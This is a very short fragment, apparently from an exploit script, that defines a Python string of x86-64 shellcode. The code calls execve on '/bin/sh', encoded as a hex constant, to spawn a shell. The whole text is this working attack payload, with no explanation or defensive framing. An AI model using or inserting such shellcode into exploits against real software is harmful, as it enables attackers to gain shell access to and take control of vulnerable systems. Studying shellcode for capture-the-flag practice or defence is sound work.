shellcode = '''
	mov al, 59
	push rbx
	push rbx
	pop rsi
	pop rdx
	mov rdi, 0x68732f6e69622f
	push rdi
	push rsp
	pop rdi
	syscall
	'''